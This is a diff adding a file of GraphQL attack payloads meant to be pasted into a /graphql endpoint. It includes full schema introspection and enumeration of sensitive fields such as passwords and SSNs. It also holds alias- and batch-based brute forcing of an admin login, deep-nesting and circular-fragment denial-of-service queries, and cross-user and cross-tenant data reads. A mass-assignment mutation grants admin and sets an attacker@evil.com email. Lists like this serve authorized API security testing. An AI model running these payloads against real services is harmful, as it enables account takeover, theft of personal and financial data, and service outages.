@@ -1,0 +1,89 @@
+# GraphQL attack payloads
+# Paste into POST /graphql with Content-Type: application/json as {"query": "..."}
+
+# --- Full introspection ---
+query IntrospectionQuery {
+  __schema {
+    queryType { name }
+    mutationType { name }
+    subscriptionType { name }
+    types {
+      kind
+      name
+      description
+      fields(includeDeprecated: true) {
+        name
+        description
+        args { name description type { kind name ofType { kind name } } defaultValue }
+        type { kind name ofType { kind name ofType { kind name } } }
+        isDeprecated
+      }
+      inputFields { name type { kind name } }
+      interfaces { name }
+      enumValues(includeDeprecated: true) { name }
+      possibleTypes { name }
+    }
+    directives { name description locations args { name type { kind name } } }
+  }
+}
+
+# --- Minimal introspection probe ---
+{ __schema { types { name } } }
+{ __type(name: "User") { name fields { name type { name } } } }
+
+# --- Field-name enumeration via suggestion ---
+{ user { passwor } }
+{ user { emai } }
+{ user { ssn } }
+{ user { adminToken } }
+
+# --- Alias-based DoS / auth bypass (repeats same op) ---
+{
+  a1: login(user:"admin", pass:"pass1") { token }
+  a2: login(user:"admin", pass:"pass2") { token }
+  a3: login(user:"admin", pass:"pass3") { token }
+  a4: login(user:"admin", pass:"pass4") { token }
+  a5: login(user:"admin", pass:"pass5") { token }
+}
+
+# --- Batched request (send as JSON array) ---
+[
+  {"query":"mutation { login(user:\"admin\", pass:\"pass1\") { token } }"},
+  {"query":"mutation { login(user:\"admin\", pass:\"pass2\") { token } }"},
+  {"query":"mutation { login(user:\"admin\", pass:\"pass3\") { token } }"}
+]
+
+# --- Deeply nested DoS ---
+{
+  users {
+    friends { friends { friends { friends { friends { name } } } } }
+  }
+}
+
+# --- Directive overloading ---
+query @skip(if:false) @skip(if:false) @skip(if:false) @skip(if:false) {
+  users { id }
+}
+
+# --- Field duplication / circular fragment ---
+fragment F on User { id ...F }
+{ user(id:"1") { ...F } }
+
+# --- BOLA via direct ID ---
+{ user(id: "{{other_user_id}}") { id email ssn creditCard } }
+{ order(id: "{{other_order_id}}") { id total items { sku } } }
+
+# --- Nested / tenant-crossing BOLA ---
+{ organization(id:"{{my_org}}") { users { id email } } }
+
+# --- Mutation BOLA / mass assignment ---
+mutation { updateUser(id:"{{other_user}}", input:{ role:"admin", email:"attacker@evil.com" }) { id role email } }
+mutation { deleteUser(id:"{{other_user}}") { id } }
+
+# --- CSRF via GET query ---
+GET /graphql?query={me{email}}
+
+# --- Alternate content-types (filter bypass) ---
+Content-Type: application/graphql
+Content-Type: application/x-www-form-urlencoded  (query=...)
+Content-Type: text/plain
